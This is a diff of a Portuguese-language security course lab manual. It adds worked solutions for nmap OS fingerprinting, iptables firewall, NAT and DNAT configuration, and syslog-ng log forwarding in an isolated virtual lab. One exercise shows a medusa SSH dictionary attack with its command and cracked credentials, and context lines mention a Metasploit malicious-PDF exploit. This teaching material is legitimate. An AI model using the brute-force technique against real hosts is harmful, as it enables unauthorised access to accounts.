+</div>
+<div class="paragraph">
+<p>A detecção do <code>nmap</code> para o Windows Server 2019, ao que parece, não foi muito precisa. Podemos adicionar a opção <code>--fuzzy</code> à invocação do <code>nmap</code> para obter resultados mais representativos:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># nmap -O --fuzzy 172.16.1.20
+
+(...)
+Aggressive OS guesses: Microsoft Windows Server 2012 (93%), Microsoft Windows Longhorn (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%), Microsoft Windows 10 1703 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 10 1511 (90%), Microsoft Windows Server 2008 R2 (90%)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+(...)
+
+Network Distance: 1 hop
+
+OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.31 seconds</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Em geral, a assinatura da máquina <em>WinServer-G</em> assemelha-se a um sistema Windows Server 2012-2016. Vamos ver se isso procede:</p>
+</div>
+<div id="img-nmap-2" class="imageblock" style="text-align: center">
+<div class="content">
+<img src="./img/nmap-2.png" alt="nmap 2">
+</div>
+<div class="title">Figure 38. Versão do SO na máquina WinServer-G</div>
+</div>
+<div class="paragraph">
+<p>Como podemos observar, o <em>WinServer-G</em> é um Windows Server 2019 Datacenter&#8201;&#8212;&#8201;os resultados no <code>nmap</code> deixam um pouco a desejar, nesse caso.</p>
+</div>
 </li>
 </ol>
 </div>
@@ -2295,7 +2785,7 @@ msf exploit(handler) &gt; exploit
 <div class="content">
 <img src="./img/metasploit-browser.png" alt="metasploit browser">
 </div>
-<div class="title">Figure 32. PDF malicioso disponível para download no browser</div>
+<div class="title">Figure 39. PDF malicioso disponível para download no browser</div>
 </div>
 <div style="page-break-after: always;"></div>
 </li>
@@ -2305,7 +2795,7 @@ msf exploit(handler) &gt; exploit
 <div class="content">
 <img src="./img/metasploit-pdf.png" alt="metasploit pdf">
 </div>
-<div class="title">Figure 33. Exploit do Adobe Reader com sucesso</div>
+<div class="title">Figure 40. Exploit do Adobe Reader com sucesso</div>
 </div>
 </li>
 <li>
@@ -2395,13 +2885,13 @@ Process List
 <div class="content">
 <img src="./img/meterpreter-commands-p1.png" alt="meterpreter commands p1">
 </div>
-<div class="title">Figure 34. Comandos do meterpreter, parte 1</div>
+<div class="title">Figure 41. Comandos do meterpreter, parte 1</div>
 </div>
 <div id="img-meterpreter-commands-p2" class="imageblock" style="text-align: center">
 <div class="content">
 <img src="./img/meterpreter-commands-p2.png" alt="meterpreter commands p2">
 </div>
-<div class="title">Figure 35. Comandos do meterpreter, parte 2</div>
+<div class="title">Figure 42. Comandos do meterpreter, parte 2</div>
 </div>
 </li>
 </ol>
@@ -2427,15 +2917,60 @@ Process List
 <ol class="arabic">
 <li>
 <p>Vamos realizar um ataque de força bruta ao serviço SSH utilizando o <code>medusa</code>. Na máquina <em>FWGW1-G</em>, crie um usuário chamado <code>marcelo</code> com a senha <code>123456</code> e outro chamado <code>marco</code> com a senha <code>abacate</code>. Depois, ainda na máquina alvo, monitore o arquivo de log <code>/var/log/auth.log</code> por tentativas de login.</p>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+FWGW1-A
+
+# useradd -m marcelo ; echo 'marcelo:123456' | chpasswd
+# useradd -m marco ; echo 'marco:abacate' | chpasswd
+
+# tail -f -n0 /var/log/auth.log</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Na máquina <em>KaliLinux-G</em>, o primeiro passo é descobrir o <em>banner</em> de serviço do SSH. Execute o comando <code>$ nc 172.16.1.1 22</code> (adapte o endereço IP se necessário) e copie o valor mostrado.</p>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+KaliLinux-A
+
+# nc 172.16.1.1 22
+SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u1</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Agora, crie dois arquivos&#8201;&#8212;&#8201;um com uma lista de usuários cujo nome será usado para login, e outro com uma lista de senhas. Não se esqueça de incluir na lista de usuários os nomes dos que foram criados no passo (1) desta atividade, bem como suas senhas no outro arquivo.</p>
+<div class="literalblock">
+<div class="content">
+<pre># pwd
+/root
+
+# cat users.txt
+root
+marcelo
+marco
+silva
+
+# cat passwords.txt
+rnpesr
+123456
+abacate
+framboesa</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Finalmente, use o comando <code>medusa</code> para executar um ataque de dicionário contra a máquina-alvo. Não se esqueça de informar o <em>banner</em> de serviço capturado no passo (2), bem como os arquivos de usuários/senhas criados no passo (3).</p>
+<div class="literalblock">
+<div class="content">
+<pre># medusa -M ssh -m BANNER:SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u1 -h 172.16.1.1 -U users.txt -P passwords.txt | grep 'SUCCESS'
+ACCOUNT FOUND: [ssh] Host: 172.16.1.1 User: marcelo Password: 123456 [SUCCESS]
+ACCOUNT FOUND: [ssh] Host: 172.16.1.1 User: marco Password: abacate [SUCCESS]</pre>
+</div>
+</div>
 </li>
 <li>
 <p>De volta à máquina <em>FWGW1-A</em>, observe o grande número de tentativas de login sem sucesso que o <code>medusa</code> realizou até que tivesse sucesso com os usuários/senhas corretos. Como o administrador de sistemas poderia detectar esse tipo de ataque e bloqueá-lo?</p>
@@ -2612,15 +3147,94 @@ Process List
 <ol class="arabic">
 <li>
 <p>Primeiro, vamos testar a filtragem simples (<em>stateless</em>) no <code>iptables</code>. Faça login na máquina <em>FWGW1-G</em> como <code>root</code> e mude a política padrão da <em>chain</em> OUTPUT para DROP. Em seguida, tente conectar-se à porta 80/HTTP de um host remoto na Internet. É possível?</p>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+FWGW1-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># nc -z -w5 -v obsd3.srv.ualberta.ca 80
+obsd3.srv.ualberta.ca [129.128.5.194] 80 (http) open</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># iptables -P OUTPUT DROP</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># nc -z -w5 -v obsd3.srv.ualberta.ca 80
+obsd3.srv.ualberta.ca: forward host lookup failed: Host name lookup failure : Resource temporarily unavailable</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Agora, crie uma regra na <em>chain</em> OUTPUT que permita a saída de pacotes na porta 80/HTTP (não se esqueça também de permitir consultas DNS à porta 53/UDP, se estiver utilizando um nome e não um endereço IP) e tente conectar-se novamente. Qual o resultado?</p>
+<div class="literalblock">
+<div class="content">
+<pre># iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
+# iptables -A OUTPUT -p udp --dport 53 -j ACCEPT</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># nc -z -w5 -v obsd3.srv.ualberta.ca 80
+obsd3.srv.ualberta.ca [129.128.5.194] 80 (http) open</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Mude a política padrão da <em>chain</em> INPUT também para DROP. Ainda é possível conectar-se?</p>
+<div class="literalblock">
+<div class="content">
+<pre># iptables -P INPUT DROP</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># nc -z -w5 -v obsd3.srv.ualberta.ca 80
+Host name lookup failure</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Apesar de o resultado parecer o mesmo obtido anteriormente, há uma diferente substancial&#8201;&#8212;&#8201;as requisições DNS/HTTP estão sendo enviado com sucesso, porém a resposta de retorno está sendo bloqueada. Rode o <code>tcpdump</code> em outra sessão e monitore a interface de rede de saída (<code>enp0s3</code>), filtrando apenas por pacotes oriundos/destinados ao IP dessa interface, enquanto o comando <code>nc</code> acima é executado. A requisição DNS e enviada e sua resposta retorna, porém é descartada pelo kernel.</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># ip a s enp0s3 | grep '^ *inet ' | awk '{print $2}'
+192.168.29.107/24</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># tcpdump -i enp0s3 -n src 192.168.29.107 or dst 192.168.29.107
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on enp0s3, link-type EN10MB (Ethernet), capture size 262144 bytes
+21:52:28.135864 IP 192.168.29.107.33147 &gt; 8.8.8.8.53: 48302+ A? obsd3.srv.ualberta.ca. (39)
+21:52:28.215508 IP 8.8.8.8.53 &gt; 192.168.29.107.33147: 48302 1/0/0 A 129.128.5.194 (55)</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Finalmente, crie uma regra apropriada na <em>chain</em> INPUT e teste o sucesso na conexão HTTP.</p>
+<div class="literalblock">
+<div class="content">
+<pre># iptables -A INPUT -p tcp --sport 80 -j ACCEPT
+# iptables -A INPUT -p udp --sport 53 -j ACCEPT</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># nc -z -w5 -v obsd3.srv.ualberta.ca 80
+obsd3.srv.ualberta.ca [129.128.5.194] 80 (http) open</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Note que devemos usar <code>--sport</code> (<em>source port</em>) ao invés de <code>--dport</code> (<em>destination port</em>), como feito anteriormente na regra da <em>chain</em> OUTPUT.</p>
+</div>
 </li>
 </ol>
 </div>
@@ -2634,6 +3248,38 @@ Process List
 <ol class="arabic">
 <li>
 <p>Remova as regras da chain INPUT. Em seguida crie uma regra genérica que permita que conexões estabelecidas sejam autorizadas através do firewall. Em seguida, tente estabelecer uma conexão HTTP. Foi possível?</p>
+<div class="literalblock">
+<div class="content">
+<pre># iptables -F INPUT</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># iptables -A INPUT -m state --state ESTABLISHED -j ACCEPT</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># iptables -L
+Chain INPUT (policy DROP)
+target     prot opt source               destination
+ACCEPT     all  --  anywhere             anywhere             state ESTABLISHED
+
+Chain FORWARD (policy ACCEPT)
+target     prot opt source               destination
+
+Chain OUTPUT (policy DROP)
+target     prot opt source               destination
+ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
+ACCEPT     udp  --  anywhere             anywhere             udp dpt:domain</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># nc -z -w5 -v obsd3.srv.ualberta.ca 80
+obsd3.srv.ualberta.ca [129.128.5.194] 80 (http) open</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Qual seria, então, a diferença entre filtros de pacotes <em>stateless</em> e <em>stateful</em>?</p>
@@ -2868,9 +3514,30 @@ target     prot opt source               destination</pre>
 <ol class="arabic">
 <li>
 <p>Primeiro, torne as políticas do firewall restritivas, ajustando a política das <em>chains</em> INPUT e FORWARD para DROP.</p>
+<div class="literalblock">
+<div class="content">
+<pre># iptables -P INPUT DROP
+# iptables -P FORWARD DROP</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Teste o funcionamento do firewall. Na máquina <em>LinServer</em>, por exemplo, tente enviar um pacote ICMP para a máquina <em>FWGW1-G</em>.</p>
+<div class="literalblock">
+<div class="content">
+<pre>$ hostname
+LinServer-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ ping -c1 172.16.1.1
+PING 172.16.1.1 (172.16.1.1) 56(84) bytes of data.
+
+--- 172.16.1.1 ping statistics ---
+1 packets transmitted, 0 received, 100% packet loss, time 0ms</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Agora, adicione as seguintes regras ao firewall:</p>
@@ -2894,12 +3561,69 @@ target     prot opt source               destination</pre>
 </div>
 </div>
 </div>
+<div class="literalblock">
+<div class="content">
+<pre># iptables -A INPUT -i lo -j ACCEPT
+# iptables -A INPUT -d 127.0.0.0/8 -i '!lo' -j REJECT --reject-with icmp-port-unreachable
+# iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
+# iptables -A INPUT -s 10.1.1.0/24 -p tcp -m tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
+# iptables -A INPUT -s 172.16.1.0/24 -p icmp -m icmp --icmp-type any -j ACCEPT
+# iptables -A INPUT -s 10.1.1.0/24 -p icmp -m icmp --icmp-type any -j ACCEPT</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Realize o teste de conexão do passo (2) novamente, e verifique que suas configurações funcionaram.</p>
+<div class="literalblock">
+<div class="content">
+<pre>$ hostname
+LinServer-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ ping -c1 172.16.1.1
+PING 172.16.1.1 (172.16.1.1) 56(84) bytes of data.
+64 bytes from 172.16.1.1: icmp_seq=1 ttl=64 time=0.235 ms
+
+--- 172.16.1.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.235/0.235/0.235/0.000 ms</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Se quiser, use o PuTTY (<a href="https://www.putty.org/" class="bare">https://www.putty.org/</a>) ou Cygwin (<a href="http://www.cygwin.com/" class="bare">http://www.cygwin.com/</a>), nas máquinas <em>WinClient-G</em> ou sua máquina física, para conectar-se à máquina <em>FWGW1-G</em> e testar sua configuração.</p>
+<div class="paragraph">
+<p>Abaixo, temos um exemplo de conexão a partir da máquina física usando Cygwin/x64 para o <em>host</em> <em>FWGW1-G</em>, via SSH.</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>fbs@LOCAL-PC ~
+$ uname
+CYGWIN_NT-10.0</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>fbs@LOCAL-PC ~
+$ ssh aluno@10.1.1.1
+No mail.
+Last login: Sun Aug 19 22:30:33 2018 from 10.1.1.254</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ whoami
+aluno</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ hostname
+FWGW1-A</pre>
+</div>
+</div>
 </li>
 </ol>
 </div>
@@ -2913,9 +3637,38 @@ target     prot opt source               destination</pre>
 <ol class="arabic">
 <li>
 <p>Adicione regras à <em>chain</em> FORWARD da tabela <em>filter</em> que permitam que o serviços da tabela referenciada acima possam ser acessados a partir da Intranet.</p>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+FWGW1-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># iptables -A FORWARD -s 10.1.1.0/24 -d 172.16.1.10/32 -p tcp -m multiport --dports 22,25,80,110,5432 -j ACCEPT
+# iptables -A FORWARD -s 10.1.1.0/24 -d 172.16.1.10/32 -p udp -m multiport --dports 53,123 -j ACCEPT</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># iptables -A FORWARD -s 10.1.1.0/24 -d 172.16.1.20/32 -p tcp -m multiport --dports 21,80,443,3389 -j ACCEPT
+# iptables -A FORWARD -s 10.1.1.0/24 -d 172.16.1.20/32 -p udp -m multiport --dports 123 -j ACCEPT</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Teste sua configuração acessando o servidor web IIS instalado na máquina <em>WinServer-G</em>, e acessando-o a partir da máquina <em>WinClient-G</em>.</p>
+<div id="img-fwd-iis-ok" class="imageblock" style="text-align: center">
+<div class="content">
+<img src="./img/firewall-fwd-iis-ok.png" alt="firewall fwd iis ok">
+</div>
+<div class="title">Figure 43. Acesso da Intranet para a DMZ</div>
+</div>
 </li>
 </ol>
 </div>
@@ -2929,11 +3682,35 @@ target     prot opt source               destination</pre>
 <ol class="arabic">
 <li>
 <p>Adicione regras à <em>chain</em> FORWARD da tabela <em>filter</em> que permitam que as redes DMZ e Intranet possam acessar qualquer serviço na Internet, via quaisquer protocolos.</p>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+FWGW1-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># iptables -A FORWARD -s 172.16.1.0/24 -o enp0s3 -j ACCEPT
+# iptables -A FORWARD -s 10.1.1.0/24   -o enp0s3 -j ACCEPT</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Teste sua configuração acessando uma página da Internet a partir da máquina <em>LinServer-G</em>.</p>
 <div class="paragraph">
 <p>Observe que, se a regra de <code>MASQUERADE</code> inserida através do arquivo <code>/etc/rc.local</code> durante o <em>boot</em> do sistema tiver sido removida durante a atividade (3) desta seção (comando <code>iptables -t nat -F</code>), o acesso acima não irá funcionar. Iremos reconfigurar regras que viabilizem a conexão logo a seguir, na atividade (4.1).</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ hostname
+LinServer-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ nc -z -w5 -v obsd3.srv.ualberta.ca 80
+obsd3.srv.ualberta.ca [129.128.5.194] 80 (http) open</pre>
+</div>
 </div>
 </li>
 </ol>
@@ -3055,6 +3832,23 @@ target     prot opt source               destination</pre>
 <ol class="arabic">
 <li>
 <p>Adicione regras à <em>chain</em> FORWARD da tabela <em>filter</em> que permitam que a Internet consiga acessar os serviços publicados pelas máquinas da DMZ, de acordo com as especificações acima.</p>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+FWGW1-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># iptables -A FORWARD -i enp0s3 -d 172.16.1.10/32 -p tcp -m multiport --dports 25,80,110 -j ACCEPT
+# iptables -A FORWARD -i enp0s3 -d 172.16.1.10/32 -p udp -m multiport --dports 53,123 -j ACCEPT
+# iptables -A FORWARD -i enp0s3 -d 172.16.1.20/32 -p tcp -m multiport --dports 21,80,443 -j ACCEPT
+# iptables -A FORWARD -i enp0s3 -d 172.16.1.20/32 -p udp -m multiport --dports 123 -j ACCEPT</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Como a tradução dos números de porta já terá sido realizado quando as regras acima forem processadas, devemos utilizar os número de porta internos (ou de serviço, de acordo com a tabela) na configuração das regras de <em>forward</em>.</p>
+</div>
 </li>
 </ol>
 </div>
@@ -3079,6 +3873,11 @@ target     prot opt source               destination</pre>
 <pre>iptables -t nat -A POSTROUTING -o enp0s3 -j MASQUERADE</pre>
 </div>
 </div>
+<div class="literalblock">
+<div class="content">
+<pre># sed -i 's/\(iptables -t nat -A POSTROUTING -o enp0s3 -j MASQUERADE\)/#\1/' /etc/rc.local</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Da mesma forma, remova essa regra do firewall, já que configuraremos outras regras, mais específicas, em seu lugar a seguir.</p>
@@ -3098,9 +3897,24 @@ num   pkts bytes target     prot opt in     out     source               destina
 </li>
 <li>
 <p>Agora sim, tudo pronto. Insira uma regra no firewall que faça tradução dos endereços das redes DMZ/Intranet via <em>masquerading</em>, permitindo assim seu acesso à Internet.</p>
+<div class="literalblock">
+<div class="content">
+<pre># iptables -t nat -A POSTROUTING -s 172.16.1.0/24 -o enp0s3 -j MASQUERADE
+# iptables -t nat -A POSTROUTING -s 10.1.1.0/24 -o enp0s3 -j MASQUERADE</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Teste sua configuração. Acesse, por exemplo, a máquina <em>LinServer-G</em> e tente acessar um site na Internet.</p>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+LinServer-A
+
+# nc -z -w5 -v obsd3.srv.ualberta.ca 80
+obsd3.srv.ualberta.ca [129.128.5.194] 80 (http) open</pre>
+</div>
+</div>
 </li>
 </ol>
 </div>
@@ -3111,15 +3925,93 @@ num   pkts bytes target     prot opt in     out     source               destina
 <ol class="arabic">
 <li>
 <p>Agora, vamos configurar o DNAT, que irá permitir acesso pela Internet aos serviços publicados pela DMZ. Comece fazendo as regras para a máquina <em>LinServer-G</em>, que não exige PAT.</p>
+<div class="literalblock">
+<div class="content">
+<pre># iptables -t nat -A PREROUTING -i enp0s3 -p tcp -m multiport --dports 25,80,110 -j DNAT --to-destination 172.16.1.10
+# iptables -t nat -A PREROUTING -i enp0s3 -p udp -m multiport --dports 53,123 -j DNAT --to-destination 172.16.1.10</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Agora, teste sua configuração. Primeiro, instale o servidor web Apache na máquina <em>LinServer-G</em>; a seguir, em sua máquina física, acesso o IP público da máquina <em>FWGW1-G</em> na porta 80/TCP e verifique que de fato é exibida no navegador a página web instalada no <em>LinServer-G</em>.</p>
+<div class="paragraph">
+<p>Primeiro, vamos instalar o servidor web Apache na máquina <em>LinServer-G</em>:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+LinServer-A
+
+# apt-get install --no-install-recommends apache2</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Em seguida, vamos monitorar o log de acesso do Apache, aguardando por conexões:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># tail -f -n0 /var/log/apache2/access.log</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Agora, temos que descobrir o IP público da máquina <em>FWGW1-G</em>:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+FWGW1-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># ip a s enp0s3 | grep '^ *inet '
+    inet 192.168.29.103/24 brd 192.168.29.255 scope global enp0s3</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Finalmente, vamos acessar esse IP na porta 80 a partir da máquina física:</p>
+</div>
+<div id="img-firewall-dnat-linserver" class="imageblock" style="text-align: center">
+<div class="content">
+<img src="./img/firewall-dnat-linserver.png" alt="firewall dnat linserver">
+</div>
+<div class="title">Figure 44. Teste DNAT do acesso Internet &gt; LinServer</div>
+</div>
+<div class="paragraph">
+<p>Voltando ao monitoramento do log de acessos do Apache na máquina <em>LinServer-G</em>, vemos que o acesso de fato se concretizou:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+LinServer-A
+
+# tail -f -n0 /var/log/apache2/access.log
+192.168.29.102 - - [25/Aug/2018:15:19:57 -0400] "GET / HTTP/1.1" 200 3380 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
+192.168.29.102 - - [25/Aug/2018:15:19:57 -0400] "GET /icons/openlogo-75.png HTTP/1.1" 200 6040 "http://192.168.29.103/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Faça o mesmo processo para a configuração do DNAT da máquina <em>WinServer-G</em>. Atente-se para o fato de que duas portas internat, 80/TCP e 123/UDP, serão acessadas através das portas externas 8080/TCP e 8123/UDP respectivamente. Configure o PAT de acordo.</p>
+<div class="literalblock">
+<div class="content">
+<pre># iptables -t nat -A PREROUTING -i enp0s3 -p tcp -m multiport --dports 21,443 -j DNAT --to-destination 172.16.1.20
+# iptables -t nat -A PREROUTING -i enp0s3 -p tcp --dport 8080 -j DNAT --to-destination 172.16.1.20:80
+# iptables -t nat -A PREROUTING -i enp0s3 -p udp --dport 8123 -j DNAT --to-destination 172.16.1.20:123</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Teste sua configuração. Em sua máquina física, acesso o IP público da máquina <em>FWGW1-G</em> na porta 8080/TCP e verifique que de fato é exibida no navegador a página web do servidor IIS instalada na máquina <em>WinServer-G</em>.</p>
+<div class="paragraph">
+<p>Utilizando o mesmo IP público descoberto anteriormente, basta acessá-lo na porta 8080 como solicitado:</p>
+</div>
+<div id="img-firewall-dnat-winserver" class="imageblock" style="text-align: center">
+<div class="content">
+<img src="./img/firewall-dnat-winserver.png" alt="firewall dnat winserver">
+</div>
+<div class="title">Figure 45. Teste DNAT do acesso Internet &gt; WinServer</div>
+</div>
 </li>
 </ol>
 </div>
@@ -3141,6 +4033,52 @@ FWGW1-A
 </div>
 <div class="paragraph">
 <p>Revise se todos os pontos abordados até aqui foram contemplados. Que outras regras interessantes poderiam ser incluídas na configuração desse firewall?</p>
+</div>
+<div class="paragraph">
+<p>Abaixo, temos a configuração final sugerida para o firewall:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-bash" data-lang="bash"># Generated by iptables-save v1.6.0 on Thu Oct 11 10:17:13 2018
+*filter
+:INPUT DROP [57:15290]
+:FORWARD DROP [0:0]
+:OUTPUT ACCEPT [75:8092]
+-A INPUT -i lo -j ACCEPT
+-A INPUT -d 127.0.0.0/8 -i !lo -j REJECT --reject-with icmp-port-unreachable
+-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
+-A INPUT -s 10.1.1.0/24 -p tcp -m tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
+-A INPUT -s 172.16.1.0/24 -p icmp -m icmp --icmp-type any -j ACCEPT
+-A INPUT -s 10.1.1.0/24 -p icmp -m icmp --icmp-type any -j ACCEPT
+-A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
+-A FORWARD -s 10.1.1.0/24 -d 172.16.1.10/32 -p tcp -m multiport --dports 22,25,80,110,5432 -j ACCEPT
+-A FORWARD -s 10.1.1.0/24 -d 172.16.1.10/32 -p udp -m multiport --dports 53,123 -j ACCEPT
+-A FORWARD -s 10.1.1.0/24 -d 172.16.1.20/32 -p tcp -m multiport --dports 21,80,443,3389 -j ACCEPT
+-A FORWARD -s 10.1.1.0/24 -d 172.16.1.20/32 -p udp -m multiport --dports 123 -j ACCEPT
+-A FORWARD -s 172.16.1.0/24 -o enp0s3 -j ACCEPT
+-A FORWARD -s 10.1.1.0/24 -o enp0s3 -j ACCEPT
+-A FORWARD -d 172.16.1.10/32 -i enp0s3 -p tcp -m multiport --dports 25,80,110 -j ACCEPT
+-A FORWARD -d 172.16.1.10/32 -i enp0s3 -p udp -m multiport --dports 53,123 -j ACCEPT
+-A FORWARD -d 172.16.1.20/32 -i enp0s3 -p tcp -m multiport --dports 21,443,80 -j ACCEPT
+-A FORWARD -d 172.16.1.20/32 -i enp0s3 -p udp -m multiport --dports 123 -j ACCEPT
+COMMIT
+# Completed on Thu Oct 11 10:17:13 2018
+# Generated by iptables-save v1.6.0 on Thu Oct 11 10:17:13 2018
+*nat
+:PREROUTING ACCEPT [2:84]
+:INPUT ACCEPT [0:0]
+:OUTPUT ACCEPT [0:0]
+:POSTROUTING ACCEPT [0:0]
+-A PREROUTING -i enp0s3 -p tcp -m multiport --dports 25,80,110 -j DNAT --to-destination 172.16.1.10
+-A PREROUTING -i enp0s3 -p udp -m multiport --dports 53,123 -j DNAT --to-destination 172.16.1.10
+-A PREROUTING -i enp0s3 -p tcp -m multiport --dports 21,443 -j DNAT --to-destination 172.16.1.20
+-A PREROUTING -i enp0s3 -p tcp -m tcp --dport 8080 -j DNAT --to-destination 172.16.1.20:80
+-A PREROUTING -i enp0s3 -p udp -m udp --dport 8123 -j DNAT --to-destination 172.16.1.20:123
+-A POSTROUTING -s 10.1.1.0/24 -o enp0s3 -j MASQUERADE
+-A POSTROUTING -s 172.16.1.0/24 -o enp0s3 -j MASQUERADE
+COMMIT
+# Completed on Thu Oct 11 10:17:13 2018</code></pre>
+</div>
 </div>
 <div style="page-break-after: always;"></div>
 </div>
@@ -3172,6 +4110,14 @@ FWGW1-A
 <ol class="arabic">
 <li>
 <p>Primeiro, vamos configurar o concentrador de logs. Acesse a máquina <em>LinServer-G</em> e instale o pacote <code>syslog-ng</code>.</p>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+LinServer-A
+
+# apt-get install --no-install-recommends syslog-ng</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Observe que na última linha do arquivo <code>/etc/syslog-ng/syslog-ng.conf</code> são incluídos arquivos com a extensão <code>.conf</code> localizados no diretório <code>/etc/syslog-ng/conf.d</code>:</p>
@@ -3184,12 +4130,78 @@ FWGW1-A
 <div class="paragraph">
 <p>Aproveitando-se desse fato, crie um novo arquivo com a extensão apropriada nesse diretório e configure o recebimento de logs remotos. Faça com que o <code>syslog-ng</code> escute por conexões na porta 514/UDP, e envie os arquivos de log de uma dado <em>host</em> para o arquivo <code>/var/log/$HOST.log</code>. Finalmente, reinicie o <code>syslog-ng</code>.</p>
 </div>
+<div class="paragraph">
+<p>Crie o arquivo novo <code>/etc/syslog-ng/conf.d/rserver.conf</code>, que cumpre os objetivos especificados, com o seguinte conteúdo:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-bash" data-lang="bash">source s_net { udp(); };
+destination d_rhost { file("/var/log/$HOST.log"); };
+log { source(s_net); destination(d_rhost); };</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Depois, basta reiniciar o serviço:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># systemctl restart syslog-ng.service</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Agora, na máquina <em>FWGW1-G</em>, instale o <code>syslog-ng</code> e configure-o como um cliente Syslog. Crie um arquivo de configuração na pasta <code>/etc/syslog-ng/conf.d</code> que envie todos os eventos de log locais para a máquina <em>LinServer-G</em> na porta 514/UDP.</p>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+FWGW1-A
+
+# apt-get install --no-install-recommends syslog-ng</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Crie o arquivo novo <code>/etc/syslog-ng/conf.d/rclient.conf</code>, que envia os logs locais para o servidor remoto, com o seguinte conteúdo:</p>
